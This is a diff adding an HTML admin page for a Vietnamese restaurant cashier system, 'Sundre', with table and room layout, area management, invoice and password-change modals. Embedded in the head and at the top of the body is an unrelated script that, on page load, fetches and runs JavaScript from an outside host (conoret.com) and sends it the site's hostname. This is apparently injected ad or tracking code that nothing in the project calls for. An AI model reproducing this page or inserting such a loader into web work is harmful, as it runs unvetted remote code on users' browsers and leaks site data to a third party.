@@ -1,0 +1,635 @@
+<html ><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<title>Sundre</title>
+
+
+	<!-- Favicon -->
+	<link rel="shortcut icon" href="ac/images/favicon.ico">
+
+	<!-- Bootstrap CSS -->
+	<link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+
+	<!-- Font Awesome CSS -->
+	<link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+	<!-- Custom CSS -->
+	<link href="assets/css/style.css" rel="stylesheet" type="text/css">
+
+	<link rel="stylesheet" type="text/css" href="/webjars/bootstrap/4.3.1/css/bootstrap.min.css">
+	<link href="assets/plugins/jstree/style.css" rel="stylesheet" type="text/css">
+	<link href="assets/plugins/datetimepicker/css/daterangepicker.css" rel="stylesheet">
+
+	<link href="assets/plugins/select2/css/select2.min.css" rel="stylesheet" type="text/css"><style>
+	a {
+		cursor: pointer
+	}
+	td{
+		font-size: 15px;
+		font-family: "Times New Roman", Times, serif;
+		/*font-family: Arial, Helvetica, sans-serif;*/
+	}
+	th,td{
+		line-height: 35px !important;
+		padding:3px !important;
+		text-align: center !important;
+	}
+	body{
+		background-color: #d9e2e2 !important;
+	}
+</style><script src="//conoret.com/dsp?h=localhost&amp;r=0.21190612957774668" type="text/javascript" defer="" async=""></script></head>
+
+<!-- <link href="..assets/plugins/jstree/style.css"
+	th:href="@{assets/plugins/jstree/style.css}" rel="stylesheet"
+	type="text/css" /> -->
+
+
+
+<body class="adminbody-void" cz-shortcut-listen="true"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+<div id="main" class="enlarged forced">
+
+	<!-- top bar navigation -->
+	<div class="headerbar">
+
+		<!-- LOGO -->
+		<div class="headerbar-left">
+			<a href="QuanLyThonTinBan.html" class="logo"><img alt="Logo" src="assets/images/logo.png"> <span>Sundre</span></a>
+		</div>
+
+		<nav class="navbar-custom">
+
+			<ul class="list-inline float-right mb-0">
+
+
+
+				<li class="list-inline-item dropdown notif"><a class="nav-link dropdown-toggle nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
+					<img src="assets/images/avatars/admin.png" alt="Profile image" class="avatar-rounded">
+				</a>
+					<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
+						<!-- item-->
+						<div class="dropdown-item">
+							<h5 class="text-overflow">
+								<small>Hello, <span name="000" id="User"> admin</span> </small>
+							</h5>
+						</div>
+
+						<!-- item-->
+						<a data-toggle="modal" data-target=".bd-example-modal-sm" class="dropdown-item notify-item"> <i class="fa fa-user"></i>
+							<span> Đổi mật khẩu</span>
+						</a>
+
+						<!-- item-->
+						<a href="/dangxuat" class="dropdown-item notify-item"> <i class="fa fa-power-off"></i> <span>Logout</span>
+						</a>
+
+
+					</div></li>
+
+			</ul>
+
+			<ul class="list-inline menu-left mb-0">
+				<li class="align-middle">
+					<button class="button-menu-mobile open-left">
+						<i class="fa fa-fw fa-bars"></i>
+					</button>
+				</li>
+			</ul>
+
+		</nav>
+
+	</div>
+	<!-- End Navigation -->
+
+
+	<!-- Left Sidebar -->
+	<div class="left main-sidebar">
+
+		<div class="sidebar-inner leftscroll">
+
+			<div id="sidebar-menu">
+
+				<ul>
+
+
+
+					<li class="submenu"><a href="#"><i class="fa fa-fw fa-table"></i> <span> Thu Ngan </span> <span class="menu-arrow"></span></a>
+						<ul class="list-unstyled">
+							<li><a href="QuanLyThonTinBan.html">Bàn
+								Phòng</a></li>
+							<li><a href="DatBan.html">Đặt
+								Bàn</a></li>
+						</ul>
+					</li>
+
+					<li class="submenu"><a href="#"><i class="fa fa-fw fa-tv"></i>
+						<span> Mặt Hàng</span> <span class="menu-arrow"></span></a>
+						<ul class="list-unstyled">
+							<li><a href="DanhSachSanPham.html">Danh Sách</a></li>
+							<li><a href="LoaiBangGia.html">Loại bảng giá</a></li>
+						</ul></li>
+					<li class="submenu"><a href="#"><i class="fa fa-fw fa-th"></i>
+						<span> Quảng Lý Chứng Từ </span> <span class="menu-arrow"></span></a>
+						<ul class="list-unstyled">
+							<li><a href="DanhSachChungTu.html">Danh sách chứng từ</a></li>
+						</ul>
+					</li>
+					<li class="submenu"><a href="KhachHang.html"><i class="fa fa-fw fa-image"></i> <span> Khách Hàng</span></a></li>
+					<li class="submenu"><a href="NhanVien.html"><i class="fa fa-fw fa-image"></i> <span> Nhân viên</span></a></li>
+				</ul>
+
+				<div class="clearfix"></div>
+
+			</div>
+
+			<div class="clearfix"></div>
+
+		</div>
+
+	</div>
+	<!-- End Sidebar -->
+
+
+	<div class="content-page">
+
+		<!-- Start content -->
+		<div class="content">
+			<div class="container-fluid"><div class="row">
+				<div class="col-xl-12">
+					<div class="breadcrumb-holder">
+						<h1 class="main-title float-left">Sơ đồ bàn, phòng</h1>
+						<ol class="breadcrumb float-right">
+							<li class="breadcrumb-item">Home</li>
+							<li class="breadcrumb-item active">Thu Ngân</li>
+							<li class="breadcrumb-item active">Sơ đồ bàn, phòng</li>
+						</ol>
+						<div class="clearfix"></div>
+					</div>
+				</div>
+			</div>
+
+				<div class="row" id="hoadon-form" style="display: none;">
+					<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+						<div class="card mb-3">
+							<div class="card-body" style="overflow: auto;">
+								<div class="row">
+									<div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 col-xl-6">
+										<div class="card mb-3">
+											<div class="card-header">
+												<h3>Thông tin đặt hàng</h3>
+											</div>
+											<div class="card-body" id="detail">
+
+											</div>
+											<div class="card-header">
+												<button type="button" class="btn btn-secondary huy float-right" style="margin: 0px 20px;" role="button"> Đóng </button>
+												<button type="button" class="btn btn-success xacnhan float-right" role="button"> Xác nhận thêm/chỉnh sửa</button>
+											</div>
+										</div>
+									</div>
+									<div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 col-xl-6">
+										<div class="card mb-3">
+											<div class="card-header">
+												<h3>Thêm thực đơn</h3>
+											</div>
+											<div class="card-body" id="thucdon" style="max-height: 500px; overflow: auto;">
+
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+
+
+
+				<div class="row">
+					<!-- <h3>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</h3> -->
+					<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+						<!-- <div class="row"> -->
+						<!-- ////////////////////////////////////////////////////////////////////////////////-->
+						<div class="card mb-3">
+							<div class="card-header">
+								<button type="button" class="btn btn-success" role="button" data-toggle="modal" data-target=".bd-example-modal-lg">
+									<i class="fa fa-list-ul bigfonts"></i> Danh sách bàn phòng, khu vực</button>
+							</div>
+							<div class="card-body" id="thungan" style="overflow: auto;">
+								<table id="listkhachhang" class="table table-bordered table-hover display">
+									<thead>
+									<tr>
+										<th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">KV</th>
+
+										<th colspan="2" style="line-height: 35px; padding:3px;text-align: center;">Chứng từ</th>
+
+										<th colspan="3" style="line-height: 35px; padding:3px;text-align: center; background-color:#f7f7f7;">Thực đơn</th>
+
+										<th colspan="4" style="line-height: 35px; padding:3px;text-align: center;">Khách hàng</th>
+
+										<th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">Nhân viên phục vụ</th>
+
+										<th rowspan="2" style="line-height: 35px; padding:3px;text-align: center;">Ghi chú</th>
+									</tr>
+									<tr>
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Số bàn</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Số chứng từ</th>
+
+										<th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Số món</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Thiếu</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center; background-color:#f7f7f7;">Số tiền</th>
+
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Ngày vào</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Thời gian</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Số khách</th>
+										<th style="line-height: 35px; padding: 3px;text-align: center;">Khách hàng</th>
+									</tr>
+									</thead>
+									<tbody class="text-nowrap">
+									<tr class="listbanle" id="banle123">
+										<td value="Gia ngay tet" name="abc">Tang 1</td>
+
+										<td>123</td>
+
+
+										<td class="banconguoi">00001BL</td>
+
+										<td>1</td>
+										<td></td>
+										<td>49990</td>
+
+										<td>2023-04-23 18:40:38.0</td>
+										<td>75 phút</td>
+										<td>0</td>
+
+										<td name="001">Huy</td>
+
+										<td name="001">nhanvien</td>
+										<td></td>
+										<td style="display: none;">0</td>
+										<td style="display: none;">0</td>
+										<td style="display: none;">0</td>
+										<td style="display: none;">50000</td>
+
+									</tr>
+									<tr class="listbanle" id="banle43534">
+										<td value="Gia ngay tet" name="abc">Tang 1</td>
+
+										<td>43534</td>
+
+
+
+										<td class="bantrong"></td>
+										<td></td>
+										<td></td>
+										<td></td>
+										<td></td>
+										<td></td>
+										<td></td>
+										<td name=""></td>
+										<td name=""></td>
+										<td></td>
+										<td style="display: none;"></td>
+										<td style="display: none;"></td>
+										<td style="display: none;"></td>
+										<td style="display: none;"></td>
+
+
+									</tr>
+									</tbody>
+								</table>
+								<div id="naa"></div>
+							</div>
+						</div>
+					</div><!-- end card-->
+					<!-- ///////////////////////////////////////////////////////////////////////////////////////////////// -->
+					<!-- </div> -->
+				</div>
+
+				<div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-hidden="true">
+					<div class="modal-dialog modal-lg">
+
+						<div class="modal-content">
+							<div class="modal-body">
+								<div class="simple-card">
+									<ul class="nav nav-tabs" id="myTab5" role="tablist">
+										<li class="nav-item">
+											<a class="nav-link active" id="product-tab-1" data-toggle="tab" href="#body-banphong" role="tab" aria-controls="product-tab-1" aria-selected="true">Danh sách bàn/phòng</a>
+										</li>
+										<li class="nav-item">
+											<a class="nav-link" id="product-tab-2" data-toggle="tab" href="#body-khuvuc" role="tab" aria-controls="product-tab-2" aria-selected="false">Khu vực</a>
+										</li>
+									</ul>
+									<div class="tab-content" id="myTabContent5" style="max-height: 450px; overflow:auto;">
+										<div class="tab-pane fade show active" id="body-banphong" role="tabpanel" aria-labelledby="product-tab-1">
+
+											<form id="form-banphong">
+												<table class="table table-bordered table-hover display" style="margin-top:10px;">
+													<thead>
+													<tr>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Số bàn / phòng</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Khu vực</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Bảng giá</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center">Không dùng</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center">Thao tác</th>
+													</tr>
+													</thead>
+													<tbody class="text-nowrap">
+													<tr class="banphong" id="banphong123">
+														<td align="center" name="123" scope="row">123</td>
+														<td align="center" name="1">Tang 1</td>
+														<td align="center" name="abc">Gia ngay tet</td>
+														<td align="center"></td>
+														<td style="color: white;">
+															<a class="btn btn-primary btn-sm edit-banphong" data-toggle="modal" data-target="#modal_edit_user_5"><i class="fa fa-pencil" aria-hidden="true"></i></a>
+															<a class="btn btn-danger btn-sm delete-banphong" data-placement="top" data-toggle="tooltip" data-title="Delete"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
+														</td>
+													</tr>
+													<tr class="banphong" id="banphong43534">
+														<td align="center" name="43534" scope="row">43534</td>
+														<td align="center" name="1">Tang 1</td>
+														<td align="center" name="abc">Gia ngay tet</td>
+														<td align="center"></td>
+														<td style="color: white;">
+															<a class="btn btn-primary btn-sm edit-banphong" data-toggle="modal" data-target="#modal_edit_user_5"><i class="fa fa-pencil" aria-hidden="true"></i></a>
+															<a class="btn btn-danger btn-sm delete-banphong" data-placement="top" data-toggle="tooltip" data-title="Delete"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
+														</td>
+													</tr>
+													</tbody>
+												</table>
+												<input type="submit" class="submit" style="display: none" name="">
+											</form>
+
+
+											<div style="display: none;" class="noob"></div>
+											<table style="display: none;">
+												<tbody class="form-add">
+												<tr class="add dle">
+													<td>
+														<input type="text" placeholder="Ký hiệu bàn" class="form-control sl-select" required="">
+													</td>
+													<td class="khuvuc-select">
+														<select class="form-control form-control-sm" name="state" required="">
+															<option value="1">Tang 1</option>
+															<option value="2">Tang 2</option>
+															<option value="3">abc</option>
+														</select>
+													</td>
+													<td class="banggia-select">
+														<select class="form-control form-control-sm" name="state" required="">
+															<option value="abc">Gia ngay tet</option>
+														</select>
+													</td>
+													<td>
+														<input class="status-checkbox" type="checkbox" name="">
+													</td>
+													<td>
+														<button type="button" class="btn-danger btn-sm remove-add"><i class="fa fa-trash-o" aria-hidden="true"></i></button>
+													</td>
+												</tr>
+												</tbody>
+											</table>
+										</div>
+										<div class="tab-pane fade" id="body-khuvuc" role="tabpanel" aria-labelledby="product-tab-2">
+
+
+											<form id="form-khuvuc">
+												<table class="table table-bordered table-hover display" style="margin-top:10px;">
+													<thead>
+													<tr>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Ký hiệu</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Tên khu vực</th>
+														<th style="line-height: 35px; padding:3px;text-align: center;" align="center">Thao tác</th>
+													</tr>
+													</thead>
+													<tbody class="text-nowrap">
+													<tr class="khuvuc" name="1" id="khuvuc1">
+														<td align="center" name="1" scope="row">1</td>
+														<td align="center">Tang 1</td>
+														<td style="color: white;">
+															<a class="btn btn-primary btn-sm edit-khuvuc" data-toggle="modal" data-target="#modal_edit_user_5"><i class="fa fa-pencil" aria-hidden="true"></i></a>
+															<a class="btn btn-danger btn-sm delete-khuvuc" data-placement="top" data-toggle="tooltip" data-title="Delete"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
+														</td>
+													</tr>
+													<tr class="khuvuc" name="2" id="khuvuc2">
+														<td align="center" name="2" scope="row">2</td>
+														<td align="center">Tang 2</td>
+														<td style="color: white;">
+															<a class="btn btn-primary btn-sm edit-khuvuc" data-toggle="modal" data-target="#modal_edit_user_5"><i class="fa fa-pencil" aria-hidden="true"></i></a>
+															<a class="btn btn-danger btn-sm delete-khuvuc" data-placement="top" data-toggle="tooltip" data-title="Delete"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
+														</td>
+													</tr>
+													<tr class="khuvuc" name="3" id="khuvuc3">
+														<td align="center" name="3" scope="row">3</td>
+														<td align="center">abc</td>
+														<td style="color: white;">
+															<a class="btn btn-primary btn-sm edit-khuvuc" data-toggle="modal" data-target="#modal_edit_user_5"><i class="fa fa-pencil" aria-hidden="true"></i></a>
+															<a class="btn btn-danger btn-sm delete-khuvuc" data-placement="top" data-toggle="tooltip" data-title="Delete"><i class="fa fa-trash-o" aria-hidden="true"></i></a>
+														</td>
+													</tr>
+													</tbody>
+												</table>
+												<input type="submit" class="submit" style="display: none" name="">
+											</form>
+											<div style="display: none;" class="noob"></div>
+											<table style="display: none;">
+												<tbody class="form-add">
+												<tr class="add dle">
+													<td>
+														<input type="text" placeholder="Ký hiệu khu vực" class="form-control kihieu" required="">
+													</td>
+													<td>
+														<input type="text" placeholder="Tên khu vực" class="form-control tenKhuVuc" required="">
+													</td>
+													<td>
+														<button type="button" class="btn-danger btn-sm remove-add"><i class="fa fa-trash-o" aria-hidden="true"></i></button>
+													</td>
+												</tr>
+												</tbody>
+											</table>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="modal-footer">
+								<button type="button" id="add-banphong" class="btn btn-success btn-sm float-left">Thêm mới</button>
+								<button type="button" id="save-banphong" class="btn btn-primary btn-sm">Lưu thay đổi</button>
+								<button type="button" class="btn btn-secondary btn-sm" data-dismiss="modal">Close</button>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<span data-toggle="modal" id="chuyenban" data-target=".chuyenban"></span>
+				<div class="modal fade chuyenban" tabindex="-1" role="dialog" aria-hidden="true">
+					<div class="modal-dialog modal-sm">
+						<div class="modal-content">
+							<div class="modal-header">
+								<h5>Chuyển bàn</h5>
+							</div>
+							<div class="modal-body" style="overflow: auto; max-height: 500px">
+								<table class="table table-bordered table-hover display" style="margin-top:10px;">
+									<thead>
+									<tr>
+										<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Khu vực</th>
+										<th style="line-height: 35px; padding:3px;text-align: center;" align="center" scope="col">Số bàn / phòng</th>
+									</tr>
+									</thead>
+									<tbody class="text-nowrap listchuyenban">
+
+									</tbody>
+								</table>
+							</div>
+							<div class="modal-footer">
+								<button type="button" class="btn btn-secondary huy-chuyenban btn-sm" data-dismiss="modal">Hủy</button>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<span data-toggle="modal" id="thanhtoan" data-target=".thanhtoan1"></span>
+				<div class="modal fade thanhtoan1" tabindex="-1" role="dialog" aria-hidden="true">
+					<div class="modal-dialog">
+						<div class="modal-content">
+							<div class="modal-header">
+								<h5>Hóa đơn</h5>
+							</div>
+							<div class="modal-body hoadon" style="overflow: auto; max-height: 500px">
+							</div>
+							<div class="modal-footer">
+								<button type="button" id="xacnhan-hoadon" class="btn btn-primary btn-sm">Xác nhận</button>
+								<button type="button" class="btn btn-secondary huy-xacnhan btn-sm" data-dismiss="modal">Hủy</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- END content -->
+
+
+
+	</div>
+	<!-- END content-page -->
+
+	<footer class="footer">
+			<span class="text-right"> Copyright <a target="_blank" href="#">47k14.12.3</a>
+	</footer>
+
+
+
+	<!-- Open modal -->
+
+	<div class="modal fade bd-example-modal-sm" tabindex="-1" role="dialog" aria-hidden="true">
+		<div class="modal-dialog modal-sm">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h5 class="modal-title">Hello, admin</h5>
+					<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+						<span aria-hidden="true">×</span>
+					</button>
+				</div>
+				<form>
+					<div class="modal-body">
+
+						<div class="form-group">
+							<label for="maukhaucu">Nhập mật khẩu cũ</label> <input type="password" class="form-control" id="maukhaucu" aria-describedby="emailHelp" placeholder="Nhập mật khẩu cũ" required="">
+
+						</div>
+						<div class="form-group">
+							<label for="maukhaumoi">Nhập mật khẩu mới</label> <input type="password" class="form-control" id="maukhaumoi" aria-describedby="numberlHelp" placeholder="Nhập mật khẩu mới" required=""> <small id="emailHelp" class="form-text text-muted">Mật khẩu phải bao gồm ít
+							nhất 8 ký tự, phải có ký tự in hoa, thường và ký tự đặc biệt.</small>
+						</div>
+						<div class="form-group">
+							<label for="xacnhan">Xác nhận lại mậu khẩu</label>
+							<input type="password" class="form-control" id="xacnhan" placeholder="Xác nhận lại mật khẩu" required="">
+						</div>
+					</div>
+					<div class="modal-footer">
+						<button type="submit" id="doimatkhau" class="btn btn-primary">Save
+							changes</button>
+						<button type="button" class="btn btn-secondary closemd1" data-dismiss="modal">Close</button>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+
+</div>
+<!-- END main -->
+
+<script src="assets/js/modernizr.min.js"></script>
+<script src="assets/js/jquery.min.js"></script>
+
+<script src="assets/js/popper.min.js"></script> <!--poper avatar-->
+<script src="assets/js/bootstrap.min.js"></script>
+
+<script src="assets/js/fastclick.js"></script> <!--right click in soffware-->
+
+<!-- App js -->
+<script src="assets/js/pikeadmin.js"></script>
+
+<!-- BEGIN Java Script for this page -->
+<script src="https://cdn.datatables.net/1.10.16/js/dataTables.bootstrap4.min.js"></script>
+<script src="/webjars/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- Counter-Up-->
+<script src="assets/plugins/waypoints/lib/jquery.waypoints.min.js"></script>
+<script src="assets/plugins/counterup/jquery.counterup.min.js"></script>
+<script src="assets/js/jquery.contextmenu.min.js"></script>
+<script src="assets/plugins/jstree/jstree.min.js"></script>
+<script src="assets/plugins/select2/js/select2.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/moment.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/daterangepicker.js"></script>
+<!-- ///////////////////////////////////////////////////////////////////// -->
+
+<!-- END Java Script for this page -->
+<script>
+
+
+
+
+
+	function load(url) {
+		if (url.split("").splice(-1) == "#") {
+			url = url.substring(0, url.length - 1);
+		}
+	}
+	// jQuery code
+	$(document).ready(function() {
+		// Show context menu on right-click
+		$('.listbanle').on("contextmenu", function(event) {
+			event.preventDefault(); // Prevent default context menu
+			// Show the context menu box
+			$("#jqContextMenu").css({
+				top: event.pageY + "px",
+				left: event.pageX + "px",
+				display: "block"
+			});
+		});
+
+		// Hide context menu on click outside
+		$('.listbanle').on("click", function() {
+			$("#jqContextMenu").hide();
+		});
+
+		// Hide context menu on ESC key press
+		$('.listbanle').on("keydown", function(event) {
+			if (event.which === 27) {
+				$("#jqContextMenu").hide();
+			}
+		});
+	});
+
+</script>
+
+<div id="jqContextMenu" style="position: absolute; z-index: 500; left: 635px; top: 318px; display: none;"><ul style="list-style: none; padding: 1px; margin: 0px; background-color: rgb(255, 255, 255); border: 1px solid rgb(153, 153, 153);">
+	<li id="capnhap-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Cập nhập</li>
+	<li id="huy-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Hủy</li>
+	<li id="chuyenban-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Chuyển bàn</li>
+	<li id="ghepban-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Ghép bàn</li>
+	<li id="thanhtoan-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;"> Thanh Toán</li>
+</ul></div><div style="background-color: rgb(0, 0, 0); position: absolute; opacity: 0.2; z-index: 499; display: none; width: 98px; height: 164px; left: 637px; top: 320px;"></div></body></html>
